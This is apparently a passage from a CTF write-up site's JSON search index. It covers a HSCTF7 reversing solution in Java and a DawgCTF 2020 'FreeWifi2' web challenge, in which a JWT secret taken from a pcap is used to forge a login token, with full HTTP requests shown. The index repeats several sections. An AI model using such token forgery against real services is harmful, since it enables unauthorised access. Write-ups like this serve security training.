bytecode for which I simply changed the line to an equivalent funtion that is simply toString to fix that. Thereafter we figured that the code was performing certain manipulations on the input and would simply check between the two strings. But the catch was where there was a sortof non reversible bubble sort kind of algorithm which picked up the two smallest values in the string and pushed them to the end of the string. And due to that a few charecters of the flag had to be guessed. However the following is the script that we used to solve the challenge.","title":"Description"},{"location":"reversing/HSCTF7/Statistics/#solution","text":"import java.util.Scanner; public class statistics { public static void main(final String[] args) { int[] arr = {102,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}; // checkstring= qtqnhuyj{fjw{rwhswzppfnfrz|qndfktceyba String com = fqntqdhuyj{fjw{rwhswzppfnbrz|qncfktaey ; String guess = abcdefghijklmnopqrstuvwxyz{_}| ; System.out.print( f ); for (int i = 1 ; i com.length() ; i ++){ char st = com.charAt(i); for (int k = 0;k guess.length();k++){ if (arr[i - 1] % 2 == 0) { arr[i] = guess.charAt(k) + (arr[i - 1] - 97); } else { arr[i] = guess.charAt(k) - (arr[i - 1] - 97); } arr[i] = (arr[i] - 97 + 29)%29 + 97; if((char)arr[i] == st){ System.out.print(guess.charAt(k)); break; } //System.out.println((char)arr[i]); }} } } Output: flag{tenpercentofallstatirqicsashfake} We had to perform several tries to finally guess the few last charecters we needed to complete the flag. But it was worth! Flag: flag{tenpercentofallstatitoicsarefake}","title":"Solution"},{"location":"web/intro/","text":"Web Exploitaion Introduction \"Write about Reverse Engineering and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. Dawg CTF 2020 FreeWifi 2","title":"Web Exploitaion"},{"location":"web/intro/#web-exploitaion","text":"","title":"Web Exploitaion"},{"location":"web/intro/#introduction","text":"\"Write about Reverse Engineering and about the writeups\"","title":"Introduction"},{"location":"web/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. Dawg CTF 2020 FreeWifi 2","title":"The contents of this repo"},{"location":"web/DawgCTF20/freewifi2/","text":"FreeWifi2 There is a pcap given. On TCP Stream 48, we can find the username: true.grit@umbccd.io In addition, there are three interesting endpoints in the pcap. You can go over all the tcp streams and eventually, you find the below details: - /jwtlogin - /forgotpassword.html - /staff.html (this got a flag which is the solution for FreeWifi1.) Trying to login with username:password as true.grit@umbccd.io:true.grit@umbccd.io gives the following token in the response: JWT 'identity'=31337 HTTP Request: POST /staff.html HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 178 Origin: https://freewifi.ctf.umbccd.io Connection: close Referer: https://freewifi.ctf.umbccd.io/staff.html Cookie: session=eyJjc3JmX3Rva2VuIjoiY2MwZjFmODY4ZWRiOTgzNTUxYzBhM2FiMzFmNDExODJiY2ViYTA5MyJ9.XpGbsA.Afj_d2U1FAfOy_LNDW-ucVcxN94; WifiKey nonce=MjAyMC0wNC0xMSAxMDozOA==; WifiKey alg=SHA1 Upgrade-Insecure-Requests: 1 csrf_token=ImNjMGYxZjg2OGVkYjk4MzU1MWMwYTNhYjMxZjQxMTgyYmNlYmEwOTMi.XpGeNA.1eSf_9aW6Z1u9djuBDm_N9KhO8M username=true.grit%40umbccd.io password=true.grit%40umbccd.io submit=Submit HTTP Response: HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Sat, 11 Apr 2020 10:39:07 GMT Content-Type: text/html; charset=utf-8 Connection: close Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMSAxMDozOQ==; Path=/ Set-Cookie: WifiKey alg=SHA1; Path=/ Set-Cookie: JWT 'identity'=31337; Path=/ Vary: Cookie Content-Length: 2666 Ideas: I think the goal is to login with /jwtlogin We have identity from the above request. In addition, there is additional information from the pcap about a secret: Set-Cookie: JWT 'secret'= dawgCTF?heckin#bamboozle ; Path=/ Using, this two values, I tried creating a JWT token using python. import jwt print jwt.encode({'identity':31337,'exp':1614291780,'iat':1475878357,'nbf':1475878357},'dawgCTF?heckin#bamboozle',algorithm='HS256') eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Below is the request that gave me the flag: HTTP Request GET /jwtlogin HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Connection: keep-alive Upgrade-Insecure-Requests: 1 Content-Length: 2 You have the flag in the reponse. DawgCTF{y0u_d0wn_w!t#_JWT?}","title":"Freewifi2"},{"location":"web/DawgCTF20/freewifi2/#freewifi2","text":"There is a pcap given. On TCP Stream 48, we can find the username: true.grit@umbccd.io In addition, there are three interesting endpoints in the pcap. You can go over all the tcp streams and eventually, you find the below details: - /jwtlogin - /forgotpassword.html - /staff.html (this got a flag which is the solution for FreeWifi1.) Trying to login with username:password as true.grit@umbccd.io:true.grit@umbccd.io gives the following token in the response: JWT 'identity'=31337 HTTP Request: POST /staff.html HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 178 Origin: https://freewifi.ctf.umbccd.io Connection: close Referer: https://freewifi.ctf.umbccd.io/staff.html Cookie: session=eyJjc3JmX3Rva2VuIjoiY2MwZjFmODY4ZWRiOTgzNTUxYzBhM2FiMzFmNDExODJiY2ViYTA5MyJ9.XpGbsA.Afj_d2U1FAfOy_LNDW-ucVcxN94; WifiKey nonce=MjAyMC0wNC0xMSAxMDozOA==; WifiKey alg=SHA1 Upgrade-Insecure-Requests: 1 csrf_token=ImNjMGYxZjg2OGVkYjk4MzU1MWMwYTNhYjMxZjQxMTgyYmNlYmEwOTMi.XpGeNA.1eSf_9aW6Z1u9djuBDm_N9KhO8M username=true.grit%40umbccd.io password=true.grit%40umbccd.io submit=Submit HTTP Response: HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Sat, 11 Apr 2020 10:39:07 GMT Content-Type: text/html; charset=utf-8 Connection: close Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMSAxMDozOQ==; Path=/ Set-Cookie: WifiKey alg=SHA1; Path=/ Set-Cookie: JWT 'identity'=31337; Path=/ Vary: Cookie Content-Length: 2666","title":"FreeWifi2"},{"location":"web/DawgCTF20/freewifi2/#ideas","text":"I think the goal is to login with /jwtlogin We have identity from the above request. In addition, there is additional information from the pcap about a secret: Set-Cookie: JWT 'secret'= dawgCTF?heckin#bamboozle ; Path=/ Using, this two values, I tried creating a JWT token using python. import jwt print jwt.encode({'identity':31337,'exp':1614291780,'iat':1475878357,'nbf':1475878357},'dawgCTF?heckin#bamboozle',algorithm='HS256') eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Below is the request that gave me the flag: HTTP Request GET /jwtlogin HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Connection: keep-alive Upgrade-Insecure-Requests: 1 Content-Length: 2 You have the flag in the reponse. DawgCTF{y0u_d0wn_w!t#_JWT?}","title":"Ideas:"}]}